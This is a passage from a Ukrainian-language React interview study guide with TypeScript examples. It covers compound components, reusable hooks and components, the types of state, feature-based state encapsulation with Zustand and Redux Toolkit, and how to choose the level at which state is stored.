  return <button aria-selected={ctx.active === value} onClick={() => ctx.setActive(value)}>{children}</button>;
};
Tabs.Panel = ({ value, children }: { value: string; children: React.ReactNode }) => {
  const ctx = useContext(TabsCtx)!;
  return ctx.active === value ? <div>{children}</div> : null;
};

// використання — споживач сам компонує структуру, стан «тече» невидимо:
<Tabs defaultValue="a">
  <Tabs.Trigger value="a">Перша</Tabs.Trigger>
  <Tabs.Trigger value="b">Друга</Tabs.Trigger>
  <Tabs.Panel value="a">Вміст А</Tabs.Panel>
  <Tabs.Panel value="b">Вміст Б</Tabs.Panel>
</Tabs>
```
Порівняй з альтернативою — одним компонентом `<Tabs items={[{label, content}, ...]} />`: він працює, поки дизайн стандартний, але «вставте бейдж у другий таб» перетворюється на новий проп. У compound-версії — просто пишеш бейдж у children. Так побудовані Radix і більшість компонентів shadcn/ui.

**➕ Пов'язане: коли застосовувати compound-компоненти (а коли ні)? 🔵**
Тест до прикладу вище — брати compound, коли виконані **всі три** умови: (1) частини утворюють одне ціле (окремо безсенсні, як `<select>/<option>`); (2) мусять ділити стан (Trigger знає активну панель); (3) споживачу потрібна свобода композиції (порядок, склад, верстка). Пропущена умова → є простіше рішення на драбині: **пропси** (фіксований вигляд) → **`children`/слоти** (вміст варіюється, спільного стану нема — див. наступне питання) → **compound** (спільний стан + свобода структури) → **headless-хук / render props** (повний контроль над рендером кожного елемента). Реалізуй через Context (пробиває будь-яку вкладеність), а не через `cloneElement` + `Children.map` (legacy: працює лише з прямими дітьми, «магічно» підкидає пропси, кепсько типізується). **Не бери** compound, коли структура фіксована (пропси простіші й безпечніші — композицію не зламати), спільного стану нема (досить `children`) або стан «гарячий»/часто змінюється (один Context на всі під-компоненти → лавина ререндерів, див. Q4).

**➕ Пов'язане: чому композиція через `children` часто краща за пропси-конфіг? 🔵**
Це та сама драбина з попереднього питання, щабель до compound. Симптом «бога-компонента»: `<Card title icon footer actions headerVariant .../>` — на кожну нову потребу дизайну додається проп, компонент знає про всі можливі варіанти вмісту і розрісся до нечитабельності. Композиція перевертає відповідальність: `<Card><CardHeader>...</CardHeader><CardContent>...</CardContent></Card>` — Card дає рамку і не знає, що всередині; будь-який новий вміст = нові children, нуль нових пропсів. Правило вибору: значення конфігурують (`size="sm"`), **вміст компонують** (children).

**➕ Пов'язане: куди класти код, потрібний двом фічам одразу? 🔵**
Природне питання після правила «фіча володіє своїм кодом»: `EnrollButton` знадобився і в `courses`, і в `dashboard` — що робити? Драбина: (1) **потерпи дублювання** — якщо збіг випадковий (просто зараз виглядають однаково), копія в кожній фічі дешевша за передчасну абстракцію (Q10); (2) якщо це справді **одна річ** і зміни мають синхронізуватись — піднімай у `shared`, але чесно: без доменних знань → `shared/ui`, з доменними (знає про курс) → окремий шар `entities/course` (як у методології FSD) або `shared/domain`; (3) одна фіча імпортує з іншої — **заборонено**: це зв'язує фічі намертво, видалити одну без другої стане неможливо. Імпорт лише «вниз» (у shared), ніколи «вбік».

## Q10. Як створювати перевикористовуваний код (компоненти, хуки, utils) і коли? 🟣

**🎯 Відповідь на іспиті:** Перевикористовуваний код — це винесені в одне місце компоненти, хуки та utils, але головне питання тут «коли»: виношу після третього повторення (правило трьох), бо дублювання дешевше за неправильну абстракцію — копію легко виправити незалежно, а невдалу абстракцію, від якої залежать п'ять місць, боляче навіть чіпати. Сигнали, що час виносити: шматок з'явився втретє, логіка не залежить від конкретної фічі, зміни хочеться робити в одному місці. За видами: кастомний хук — для логіки зі станом (наприклад, `useDebouncedValue`), перевикористовуваний компонент — для UI без доменних знань (Modal, що отримує все через пропси), utils — чисті функції, найдешевший вид перевикористання. Важлива React-специфіка контракту: функції порівнюються за посиланням, тому хук, який повертає колбеки, має віддавати стабільні посилання через `useCallback` — інакше в споживачів ламаються deps і мемоізація. Типова помилка — wrong abstraction: виніс спільне з двох схожих шматків, а на третьому випадку абстракція обростає прапорцями; ліки — розділити її назад на копії й подивитися, що справді спільне.

Дві протилежні поразки, між якими треба пройти. Перша: один і той самий debounce-код скопійований у п'яти компонентах — багфікс треба повторити п'ять разів, і одну копію забудуть. Друга: розробник «на майбутнє» виніс у `shared/` абстракцію під єдиний випадок використання — і тепер кожна нова потреба вимагає розширювати її прапорцями (`mode`, `isSpecialCase`), поки вона не стала складнішою за п'ять копій разом. Тож питання «як створювати перевикористовуваний код» — це насамперед питання **коли**.

**Коли виносити — сигнали:** той самий шматок з'явився **втретє** (правило трьох: два збіги можуть бути випадковістю, три — закономірність); логіка не залежить від конкретної фічі; зміни хочеться робити в одному місці. До того — свідомо дублюй: **дублювання дешевше за неправильну абстракцію**, бо копію легко виправити незалежно, а невдалу абстракцію, від якої залежать п'ять місць, — боляче навіть чіпати.

**Кастомний хук** — перевикористання *логіки зі станом* (звичайна функція тут не допоможе — їй нема де тримати state між рендерами):
```ts
function useDebouncedValue<T>(value: T, delay = 300): T {
  const [debounced, setDebounced] = useState(value);
  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), delay);
    return () => clearTimeout(id); // ← нове value до спливу таймера скасовує попередній —
  }, [value, delay]);              //   тому "наздоганяє" лише останнє значення паузи
  return debounced;
}
// споживач: const debouncedQuery = useDebouncedValue(query); — і фільтрація з Q6
// виконується раз після паузи в друці, а не на кожен символ
```

**Перевикористовуваний код — це API, і в React в API входить стабільність посилань.** Нагадування, на якому все тримається: у JS функції та об'єкти порівнюються **за посиланням**, а не за вмістом — `(() => {}) === (() => {})` дає `false`. Кожен рендер компонента створює *нові* функції та об'єкти. Тому якщо твій хук повертає функцію, кожен рендер повертатиме «нову» — і споживач не зможе безпечно покласти її в `deps` іншого хука чи передати в мемоізований компонент:
```ts
// ❌ ДО: reset — нова функція щорендер
function usePagination() {
  const [page, setPage] = useState(1);
  return { page, setPage, reset: () => setPage(1) };  // ← нове посилання на кожен рендер
}
// наслідок у споживача: useEffect(() => reset(), [filters, reset]) — спрацьовує
// на КОЖЕН рендер (reset «щоразу інший»), хоча filters не змінились

// ✅ ПІСЛЯ: стабільне посилання — useCallback повертає ту САМУ функцію між рендерами
function usePagination() {
  const [page, setPage] = useState(1);
  const reset = useCallback(() => setPage(1), []);    // ← одна й та сама функція завжди
  return { page, setPage, reset };
}
```
Для власного локального коду це деталь; для перевикористовуваного хука — частина контракту: споживачі *будуть* класти твої функції в deps, і нестабільні посилання стануть їхніми багами.

**Перевикористовуваний компонент** — без прив'язки до фічі (критерій з Q9: нуль доменних знань):
```tsx
function Modal({ open, onClose, children }: ModalProps) {
  if (!open) return null;
  return (
    <div className="overlay" onClick={onClose}>
      {/* stopPropagation: клік ПО модалці не «спливає» до overlay і не закриває її */}
      <div className="modal" onClick={(e) => e.stopPropagation()}>{children}</div>
    </div>
  );
}
```
Зверни увагу, чого тут *нема*: тексту, доменних типів, запитів. Усе приходить ззовні (`open`, `onClose`, `children`) — тому Modal працює і для підтвердження видалення курсу, і для перегляду сертифіката.

**Utils** — чисті функції без стану (`formatDuration`, `pluralize`): найдешевший вид перевикористання, виноситься найлегше, тестується без React (Q16).

**Типова помилка рівня** — «wrong abstraction»: побачив два *схожі* шматки, виніс спільне, а на третьому випадку відмінності полізли назовні — і абстракція обростає прапорцями. Ліки: якщо для нового споживача доводиться додавати умовну гілку всередину абстракції — розділи її назад на копії і подивись, що *справді* спільне.

**Підсумок-якір:** виноси після третього повторення, не раніше (дублювання дешевше за неправильну абстракцію); хук — для логіки зі станом, компонент — для UI без доменних знань, utils — для чистих функцій; і пам'ятай, що API перевикористовуваного хука включає стабільність посилань — повертай функції через `useCallback`.

**➕ Пов'язане: чим `useMemo` відрізняється від `useCallback`? 🔵**
У `usePagination` вище ми загорнули `reset` в `useCallback` — це один із двох близнюків мемоізації. Обидва кешують щось між рендерами, поки не зміняться залежності: **`useMemo(fn, deps)`** викликає `fn` і кешує **результат** (значення) — для дорогих обчислень чи стабільних об'єктів; **`useCallback(fn, deps)`** кешує **саму функцію**, не викликаючи її, — для стабільних посилань на колбеки. Формально `useCallback(fn, deps)` ≡ `useMemo(() => fn, deps)`. Коли що: обчислюєш значення → useMemo; передаєш функцію в мемоізований компонент або в deps → useCallback. І анти-порада: не загортай усе підряд «для швидкості» — мемоізація сама коштує пам'яті й порівнянь deps, тож без виміряної проблеми (Q6) вона — шум у коді.

**➕ Пов'язане: які головні правила хуків? 🔵**
Кожен кастомний хук, як `useDebouncedValue` вище, мовчки підкоряється двом правилам React. (1) Викликати хуки лише **на верхньому рівні** компонента чи іншого хука — не в `if`, циклах чи вкладених функціях. (2) Лише з React-функцій (компонент або `use*`-хук). Причина — механіка: React не знає імен твоїх хуків, він зіставляє їх **за порядком виклику** (перший useState — перша «комірка» стану, другий — друга…). Виклик в `if` означає, що на наступному рендері порядок може зсунутись — і React віддасть стану чужі значення: `const [a] = useState(0)` раптом отримає значення сусіднього `useState("")`. Лінтер `eslint-plugin-react-hooks` ловить порушення автоматично — він має бути увімкнений.

**➕ Пов'язане: коли HOC, а коли хук? 🟢**
До хуків логіку перевикористовували через **HOC** (higher-order component — функція, що загортає компонент у компонент: `withAuth(Page)`) і render props. Проблема HOC видно в devtools: три обгортки = три зайві рівні дерева («wrapper hell»), плюс неочевидно, звідки в пропсах узявся `user`. Кастомний хук робить те саме пласко і явно: `const user = useAuth()` — видно, що і звідки. Сьогодні дефолт — хук; HOC лишається для випадків, коли треба обгорнути *сам компонент* (Error Boundary, мемоізація `React.memo` — це, до речі, теж HOC).

**➕ Пов'язане: як типізувати перевикористовуваний компонент дженериком? 🔵**
`useDebouncedValue<T>` вище — дженерик-хук; для компонентів той самий прийом рятує від `any` у списках. Проблема: `<List items={courses} renderItem={(c) => ...} />` — як типізувати, щоб `c` автоматично був `Course` для курсів і `Student` для студентів? Дженерик-компонент:
```tsx
function List<T>({ items, renderItem }: { items: T[]; renderItem: (item: T) => React.ReactNode }) {
  return <ul>{items.map((i, idx) => <li key={idx}>{renderItem(i)}</li>)}</ul>;
}
// <List items={courses} renderItem={(c) => c.title} /> — c виведено як Course, без жодної анотації
```
TypeScript виводить `T` з `items` і сам типізує колбек — перевикористовуваний компонент лишається строго типізованим для кожного споживача.

## Q11. Які бувають типи state і як пропагувати дані між компонентами? 🔵

**🎯 Відповідь на іспиті:** Стан ділиться на чотири типи за власником: component state (модалка, текст поля — `useState`), глобальний client state (тема, поточний користувач — Context чи Zustand), server state (дані з бекенду, де твоя копія — лише кеш, — React Query) і browser state (URL-параметри, localStorage). Пропагація даних у React односпрямована, згори вниз: дефолтний канал — props (дані вниз, події вгору через колбеки); коли значення потрібне багатьом компонентам на різній глибині — React Context транслює його top-to-bottom без проміжних рук; а зовнішній стор типу Redux чи Zustand працює за принципом event injection — компонент диспатчить подію у стор повз дерево, і реагують усі підписані, де б вони не були. Серверний стан тече окремим контуром: компоненти не передають його одне одному, а беруть зі спільного кешу React Query за `queryKey`. Правило — обирати найпростіший канал, якого вистачає; помилка класифікації коштує зайвої роботи: серверні дані в Zustand — це власноруч переписаний кеш.

Це питання — **карта**: які взагалі бувають види стану і якими каналами дані рухаються між компонентами. (Суміжні питання розведемо одразу: *який менеджер обрати* під кожен тип — Q4; *як сховати стан усередині фічі* — Q12; *на якому рівні дерева його тримати* — Q13. Тут — самі типи і механізми руху.)

**Типи стану** — з прикладами з нашої платформи, бо тип визначається не даними, а їхнім «власником» і часом життя:

| Тип | Хто власник | Приклад | Де живе |
|---|---|---|---|
| **Component (local)** | один компонент | відкрита/закрита модалка, текст у полі | `useState`/`useReducer` |
| **Global (client)** | весь застосунок | тема, поточний користувач | Context / Zustand |
| **Server** | **бекенд** (у нас — кеш) | список курсів, прогрес студента | React Query |
| **Browser / URL** | браузер | `?filter=active&page=2`, збережена тема | URL-параметри, localStorage |

Помилка класифікації = зайва робота: потягнув локальний стан у глобальний стор — отримав зв'язність і ререндери; поклав серверні дані в Zustand — власноруч переписуєш кеш (Q4).

**Механізми пропагації** — як дані фізично рухаються деревом. Базовий факт React: дані течуть **односпрямовано, згори вниз** — батько передає дітям, ніколи навпаки. Усі механізми — варіації на цю тему:

**1. Props (дефолт).** Явна передача від батька до дитини. Найкращий канал: залежності видно в сигнатурі, типізується, тестується. «Вгору» дані повертаються теж через props — батько передає колбек, дитина його викликає:
```tsx
function CoursePage() {
  const [selected, setSelected] = useState<string | null>(null);
  //                 дані вниз ↓            подія вгору ↓
  return <CourseList courses={courses} onSelect={setSelected} />;
}
```

**2. Context (трансляція вниз без проміжних рук).** Коли значення потрібне багатьом компонентам на різній глибині, тягти його props-ами крізь усіх проміжних — боляче (це «prop drilling», див. похідне). Context дозволяє будь-якому нащадку взяти значення напряму:
```tsx
const UserCtx = createContext<User | null>(null);
function App() {
  const [user] = useState<User | null>(current);
  return <UserCtx.Provider value={user}><Header /></UserCtx.Provider>;
}
function Header() {
  const user = useContext(UserCtx); // ← дістає напряму, скільки б рівнів не було між ними
  return <span>{user?.name}</span>;
}
```
Ціна: неявність (залежність не видно в пропсах) і ререндер усіх споживачів на кожну зміну — тому Context для рідкозмінного.

**3. Зовнішній стор (підписка повз дерево).** Zustand/Redux тримають стан **поза** деревом компонентів; компонент диспатчить подію (`toggle()`, `dispatch(action)`), стор оновлюється, і всі *підписані* компоненти реагують — незалежно від того, де вони в дереві. Це «event injection»: канал зв'язку між далекими гілками без спільного предка-посередника. Селектори дають точкову підписку (ререндер лише при зміні свого зрізу — Q4).

**4. Server-стан тече окремим контуром:** компоненти не передають серверні дані одне одному — кожен, кому треба, викликає `useQuery(["courses"])` і отримує з **кешу** (спільної пам'яті React Query). Два компоненти з одним `queryKey` бачать одні дані без жодного props/Context.

**Драбина вибору каналу:** props (поки не болить) → композиція/children (щоб не свердлити крізь проміжні) → Context (рідкозмінне глобальне) → стор (частозмінне глобальне) → а серверні дані — завжди своїм контуром через React Query.

**Підсумок-якір:** чотири типи стану (local / global / server / URL) розрізняються власником; канали руху — props (явно, вниз, дефолт), колбеки (події вгору), Context (трансляція вниз), стор (підписка повз дерево), React Query (спільний кеш серверного). Обирай найпростіший канал, якого вистачає.

**➕ Пов'язане: що таке prop drilling і як його уникнути? 🔵**
Це той біль, з якого в основній відповіді виріс Context. **Prop drilling** — пропс проштовхується крізь компоненти, яким він самим не потрібен: `App → Layout → Sidebar → UserMenu`, і `Layout` із `Sidebar` тягнуть `user` лише щоб передати далі. Симптоми: зміна типу пропа правиться в п'яти файлах; проміжні компоненти неможливо перевикористати без цього пропа. Два виходи: **Context** (якщо значення справді глобальне і рідкозмінне) або — часто краще — **композиція**: передати готовий елемент через `children`, і проміжні рівні взагалі не знатимуть про дані: `App` рендерить `<Layout sidebar={<UserMenu user={user} />} />` — `Layout` більше не бачить `user`. Дрилити один рівень — нормально; дрилити три і більше — сигнал перебудувати.

**➕ Пов'язане: чому надмірний Context спричиняє зайві ререндери? 🔵**
В основному тексті Context дістався «рідкозмінного» — ось механіка обмеження. При зміні `value` провайдера React ререндерить **усіх** споживачів цього Context — точкової підписки на частину значення не існує. Класична пастка — один «великий» Context: `value={{ user, theme, notifications }}` — набіг нового сповіщення ререндерить і тих, хто читає лише `theme`. Друга пастка тонша: `value={{ user }}` створює **новий об'єкт щорендер** батька (посилання змінилось — споживачі ререндеряться, хоч user той самий). Ліки за наростанням: стабілізувати value через `useMemo` → розділити на кілька вузьких Context (UserCtx, ThemeCtx) → частозмінне забрати в стор із селекторами (Q4).

**➕ Пов'язане: коли URL — найкращий стор? 🟢**
Четвертий рядок таблиці типів часто недооцінюють. Тест: **чи має стан пережити F5 і чи хочеться поділитись ним посиланням?** Фільтри списку курсів, номер сторінки, відкрита вкладка профілю — якщо тримати їх у `useState`, оновлення сторінки скидає все, а надіслати колезі «дивись, що я знайшов» неможливо. В URL (`/courses?filter=active&page=2`) стан отримує безкоштовно: збереження при перезавантаженні, кнопку «назад», шерабельне посилання. У React Router це `useSearchParams`: читаєш як стан, пишеш — і URL оновлюється. Не для URL: чернетки, приватне, об'ємне.

## Q12. Як інкапсулювати і структурувати state (feature-based)? 🟣

**🎯 Відповідь на іспиті:** Інкапсуляція state стоїть на двох принципах: стан живе поруч із фічею, якій належить (feature-based: стор фічі лежить у її теці — видалив фічу, видалив і її стан, мертвих полів не лишається), а назовні фіча показує публічний API, а не реалізацію. Практично: у `features/cart` живе свій стор — байдуже, Zustand-стор чи Redux-slice, — а через `index.ts` експортується лише хук `useCart`; стор під ним — деталь реалізації. Заради цього все й робиться: реалізацію можна переписати, скажімо, з Redux на Zustand, не зачепивши жоден компонент-споживач, бо всі знають лише хук — без інкапсуляції така міграція означає правки в десятках файлів. Що класти під хук, обираю за драбиною складності: `useState` → Context + `useReducer` → Zustand (коли потрібні селектори проти зайвих ререндерів) → Redux Toolkit — і міняю в міру росту потреби. Типова помилка — «інкапсуляція на папері»: `index.ts` існує, але колеги імпортують стор напряму; лікується правилом лінтера на import boundaries, щоб обхід був червоним ще в редакторі.

Продовження карти з Q11: типи стану ясні — тепер *де цей стан має жити в кодовій базі*. Антиприклад, від якого відштовхуємось: один глобальний стор на весь застосунок, куди фічі роками зносили свої шматки. Наслідки конкретні: неможливо зрозуміти, хто змінює `state.ui.flags.isDirty`; видалення фічі лишає мертві поля назавжди («а раптом хтось читає?»); дві фічі випадково зав'язались на чужі внутрішності — і тепер змінюються лише разом.

Рішення складається з **двох принципів**: (1) стан живе поруч із фічею, якій належить; (2) назовні фіча показує **публічний API**, а не реалізацію.

**Принцип 1 — стор на фічу.** Патерн не прив'язаний до менеджера: фіча володіє своїм стором, байдуже Zustand це чи Redux slice.

Zustand — окремий стор на фічу, мінімум коду:
```ts
// features/cart/cartStore.ts
import { create } from "zustand";
export const useCartStore = create<{
  items: CartItem[];
  add: (i: CartItem) => void;
  clear: () => void;
}>((set) => ({
  items: [],
  add: (i) => set((s) => ({ items: [...s.items, i] })),  // новий масив, не push — імутабельність (Q16)
  clear: () => set({ items: [] }),
}));
```
Той самий шматок на Redux Toolkit — slice (фрагмент стору зі своїми reducer-ами), який глобальний стор збирає з інших фіч:
```ts
// features/cart/cartSlice.ts
const cartSlice = createSlice({
  name: "cart",
  initialState: { items: [] as CartItem[] },
  reducers: {
    add: (state, action) => { state.items.push(action.payload); }, // тут push можна: Immer під капотом
    clear: (state) => { state.items = []; },
  },
});
export const { add, clear } = cartSlice.actions;
export default cartSlice.reducer;
```
В обох випадках логіка стану живе **поруч із фічею** — видалив теку `features/cart` → видалив і її стан, мертвих полів не лишається.

**Принцип 2 — інкапсуляція: сховати реалізацію за публічним API.** Інкапсуляція — загальний принцип: назовні видно, *що* можна зробити, але не *як* воно влаштоване. Для фічі це означає: назовні експортується **лише хук**, а стор під ним — деталь:
```ts
// features/cart/index.ts — ПУБЛІЧНИЙ API фічі (тільки це імпортують ззовні)
export { useCart } from "./useCart";
// cartStore / cartSlice, селектори назовні НЕ експортуються

// features/cart/useCart.ts — тонка обгортка, що ховає джерело даних
export function useCart() {
  const items = useCartStore((s) => s.items);   // Zustand: беремо потрібне селектором
  const add = useCartStore((s) => s.add);
  return { items, add };
  // (на Redux тут було б useSelector(selectCartItems) + useDispatch — API хука ТОЙ САМИЙ)
}

// споживач знає лише хук, а не стор під ним:
const { items, add } = useCart();  // заміниш Zustand ⇄ Redux — цей рядок не зміниться
```
Ось заради чого це все: внутрішню реалізацію можна переписати, **не зачепивши жоден компонент-споживач**. Без інкапсуляції «мігруємо кошик з Redux на Zustand» = правки у 40 файлах; з нею = правки в одному.

**Що саме покласти під `useCart` — драбина за складністю потреби** (реалізація схована, тож її можна міняти в міру росту):

| Всередині `useCart` | Коли брати |
|---|---|
| `useState` / `useReducer` (локально) | стан живе в піддереві однієї сторінки — стор не потрібен |
| `useContext` (+ `useReducer`) | ділити в піддереві, змінюється рідко/помірно, без бібліотеки |
| Zustand-хук | частозмінний стан або потрібні селектори проти зайвих ререндерів |
| Redux Toolkit | велика команда, суворі правила, dev-tools |

Проміжний щабель — **Context + `useReducer`**, легкий «стор фічі» без бібліотек:
```tsx
const CartCtx = createContext<CartApi | null>(null);

export function CartProvider({ children }: { children: React.ReactNode }) {
  const [items, dispatch] = useReducer(cartReducer, []);
  // useMemo обов'язковий: без нього value — новий об'єкт щорендер → ререндер УСІХ споживачів (Q11)
  const value = useMemo(() => ({ items, add: (i: CartItem) => dispatch({ type: "add", i }) }), [items]);
  return <CartCtx.Provider value={value}>{children}</CartCtx.Provider>;
}

export function useCart() {                 // той самий публічний хук — джерело просто інше
  const ctx = useContext(CartCtx);
  if (!ctx) throw new Error("useCart must be used within CartProvider"); // ← падає гучно і зрозуміло,
  return ctx;                                                            //   а не тихим undefined
}
```
Межа цього щабля: Context ререндерить усіх споживачів на кожну зміну `value` (селекторів нема) — для частозмінного стану наступний щабель, Zustand.

**Типова помилка:** «інкапсуляція на папері» — index.ts існує, але колеги імпортують `features/cart/cartStore` напряму, бо ніщо не забороняє. Через пів року реалізацію знову не можна змінити. Як заборонити технічно — див. похідне про import boundaries.

**Підсумок-якір:** стан фічі живе у фічі (видалив фічу — видалив стан), назовні — лише публічний хук через index.ts; реалізацію під хуком обирай за драбиною useState → Context+useReducer → Zustand → RTK і міняй у міру росту — інкапсуляція гарантує, що споживачі цього не помітять.

**➕ Пов'язане: навіщо мемоізовані селектори (`createSelector`)? 🔵**
У `useCart` вище селектор брав готове поле (`s.items`) — а що, як потрібні *похідні* дані, напр. «лише активні курси»? Наївний селектор `(s) => s.courses.filter(c => c.active)` створює **новий масив на кожен виклик** (filter завжди повертає новий) — а компоненти порівнюють результати за посиланням (Q10), тож «нове посилання» = «дані змінились» = ререндер, навіть якщо вміст той самий. `createSelector` (Reselect, вбудований у RTK) мемоізує: поки вхід (`s.courses`) не змінився — повертає **те саме** посилання на результат, і зайві ререндери зникають. Правило: селектор, що створює новий об'єкт/масив (filter, map, sort), — мемоізуй.

**➕ Пов'язане: що таке нормалізація state і навіщо? 🟢**
Ще одне рішення *всередині* стору фічі, приховане за публічним API. Проблема вкладеної структури: `courses: [{ id, lessons: [{ id, ... }] }]` — щоб оновити один урок, треба знайти курс, знайти урок, пересоздати обидва масиви; а якщо той самий урок фігурує у двох місцях — дані дублюються і розсинхронізуються. **Нормалізація** — зберігати сутності пласкими мапами за id, як у реляційній БД: `{ courses: { [id]: course }, lessons: { [id]: lesson } }`, а зв'язки — масивами id (`course.lessonIds`). Оновлення уроку = `lessons[id] = newLesson`, одна операція без глибокого копіювання і без дублікатів. У RTK для цього є готовий `createEntityAdapter`.

**➕ Пов'язане: як технічно заборонити обхід публічного API фічі? 🔵**
Відповідь на «інкапсуляцію на папері» з типових помилок. Домовленість «імпортуй лише з index.ts» має стати правилом лінтера, інакше вона помре з першим дедлайном. Варіанти: `eslint-plugin-boundaries` або `import/no-restricted-paths` — правило на кшталт «з-поза `features/cart` можна імпортувати лише `features/cart/index.ts`»; у монорепо ту саму роль грають межі пакетів (імпортуєш лише те, що пакет експортує). Ефект: спроба `import { useCartStore } from "features/cart/cartStore"` — червона ще в редакторі, і публічний API лишається єдиними дверима не за домовленістю, а за фактом.

## Q13. Що таке generic (dumb) компоненти і як обрати рівень зберігання стану? 🟣

**🎯 Відповідь на іспиті:** Generic (dumb) компонент — це компонент, який отримує все через пропси і нічого не знає про домен: він відповідає за «як виглядає», а «що відбувається» — дані, мутації, доменні рішення — живе в розумному контейнері чи хуку. Це дає перевикористання і дешеві тести: dumb-кнопку можна відрендерити в Storybook без стору і використати для будь-якої дії. Друга частина питання — рівень зберігання стану: стан кладу на найнижчого спільного предка всіх, хто його читає чи пише, і ні рівнем вище. Обидва напрямки помилки болючі: тримаєш занизько — доводиться «синхронізувати» стан між сусідами дубльованими `useState` і `useEffect`; тримаєш зависоко — кожна зміна ререндерить велике піддерево, а стан живе довше за потребу. Тому дефолтний рух — знизу вгору за доведеною потребою: почав локально, знадобилось сусідові — підняв до спільного предка, знадобилось усьому застосунку — лише тоді глобальний механізм. Класична помилка — стан форми в Redux «бо так прийнято в проєкті»: текст полів потрібен лише формі, а ререндериться все, що підписане на стор.

Дві ідеї в одному питанні, і обидві — про те, щоб компоненти не знали зайвого: (1) розділяти «дурні» презентаційні компоненти й «розумні» контейнери; (2) тримати стан на найнижчому достатньому рівні дерева.

**Ідея 1 — generic (dumb) компонент: отримує все через пропси, не знає про домен.** Проблема видно на прикладі:
```tsx
// ❌ ДО: «розумна» кнопка — сама лізе у стор і диспатчить доменну дію
function EnrollButton() {
  const dispatch = useDispatch();
  return <button onClick={() => dispatch(enroll())}>Записатись</button>;
}
// наслідки: не перевикористаєш для іншої дії; не відрендериш у Storybook без стору;
// тест вимагає обгортки з Redux-провайдером — заради однієї кнопки

// ✅ ПІСЛЯ: generic — поведінку передають ззовні, кнопка лише малює
function Button({ onClick, children }: { onClick: () => void; children: React.ReactNode }) {
  return <button className="btn" onClick={onClick}>{children}</button>;
}
// «розум» переїхав у контейнер (feature-рівень з Q9):
function EnrollSection({ courseId }: { courseId: string }) {
  const { mutate: enroll } = useEnroll(courseId);       // знає ЩО робити
  return <Button onClick={() => enroll()}>Записатись</Button>; // dumb знає ЯК виглядати
}
```
Поділ праці: dumb-компонент відповідає за «як виглядає» (рендер пропсів), контейнер — за «що відбувається» (дані, мутації, доменні рішення). Dumb-компоненти — це і є рівень library/UI з Q9: тестуються без моків, живуть у Storybook, переносяться між проєктами. З появою хуків «розумним» бути стало дешево (не окремий клас-контейнер, а рядок `useEnroll()`), але сам поділ нікуди не подівся — просто «розум» тепер зазвичай у хуку + тонкому контейнері.

**Ідея 2 — рівень зберігання стану.** Правило: стан живе на **найнижчому спільному рівні** для всіх, кому він потрібен. Алгоритм: (1) випиши, хто читає/пише стан; (2) знайди їхнього найближчого спільного предка; (3) поклади стан туди — і ні рівнем вище:
```tsx
function SearchBox() {                 // стан потрібен і полю, і кнопці → їхній спільний батько
  const [q, setQ] = useState("");
  return (<>
    <input value={q} onChange={(e) => setQ(e.target.value)} />
    <button disabled={!q}>Шукати</button>
  </>);
}
```
Обидва напрямки помилки болючі, і по-різному:
- **тримаєш занизько** — стан треба «синхронізувати» між сусідами: з'являються дубльовані useState і useEffect, що переписує один стан з іншого (класичний запах);
- **тримаєш зависоко** (одразу глобально «про запас») — кожна зміна ререндерить велике піддерево (набрав символ у пошуку — блимає вся сторінка), стан живе довше за потребу (відкрив сторінку вдруге — там старий пошук), а зв'язок «хто цим володіє» губиться.

Дефолтний рух — **знизу вгору за потребою**: почни локально; знадобилось сусідові — підніми до спільного предка; знадобилось усьому застосунку — тоді глобальний механізм (яким саме — Q4; як інкапсулювати — Q12).

**Типова помилка на співбесідах і в коді** — «стан форми в Redux, бо так прийнято в проєкті»: текст полів потрібен лише формі, а ререндериться на кожен символ усе, що підписане на стор.

**Підсумок-якір:** dumb-компонент = вигляд через пропси, нуль доменних знань (звідси перевикористання і легкі тести); стан = на найнижчому спільному предку тих, хто ним користується, і піднімається лише коли з'являється новий споживач — не «про запас».

**➕ Пов'язане: чим controlled компонент відрізняється від uncontrolled? 🔵**
`<input value={q} onChange={...}/>` у SearchBox вище — це **controlled**: джерело правди — React-стан, DOM лише відображає його; кожне натискання = setState = ререндер, зате значення завжди під рукою — можна валідувати, форматувати, блокувати кнопку (`disabled={!q}`) на льоту. **Uncontrolled** — джерело правди в самому DOM: React не втручається, значення читаєш разово через `ref` (`inputRef.current.value`) у момент сабміту. Вибір: потрібна реакція на кожен символ (пошук, живі підказки, маска) → controlled; велика форма, де важливий лише фінальний результат → uncontrolled дешевший (нуль ререндерів під час друку) — саме на цьому будує продуктивність react-hook-form. Пастка-класика: перемикання між режимами в рантаймі (`value={undefined}` → раптом value є) — React пише warning «changing an uncontrolled input to controlled»; обирай режим одразу.

**➕ Пов'язане: що таке колокація стану (state colocation)? 🟢**
Це ім'я для «дефолтного руху знизу вгору» з основної відповіді, сформульоване як принцип: тримай стан якнайближче до місця використання і піднімай лише за доведеної потреби. Практичний тест колокації: якщо стан можна перемістити вглиб дерева і ніщо не зламається — перемісти; кожен рівень «нижче» = менше компонентів, що ререндеряться, і простіша відповідь на «хто цим володіє». Це протилежність звичці «все в глобальний стор» (див. типову помилку вище).

**➕ Пов'язане: підняв стан до спільного предка — і тепер усе піддерево ререндериться. Що робити? 🔵**
Природний наслідок правила з ідеї 2: підняв стан у високого предка — тепер його зміна ререндерить *усе* між предком і споживачами. Драбина лікування: (1) **перевір, чи справді треба було піднімати** — може, споживач один і стан можна опустити назад (колокація); (2) **композиція**: незалежні від стану піддерева передай через `children` — React не ререндерить children, якщо їхнє посилання не змінилось: `<Provider>{children}</Provider>` — зміна стану провайдера не чіпає children; (3) **точкова мемоізація**: `React.memo` на важкі гілки, яким пропси не змінюються (працює лише зі стабільними посиланнями — Q10); (4) стан справді «гарячий» і глобальний → стор із селекторами (Q4). Порядок важливий: спершу архітектурні ходи (1–2), потім мемоізація — вона лікує симптом, а не причину.

## Q14. Як оптимізувати великий UI-застосунок? 🟣

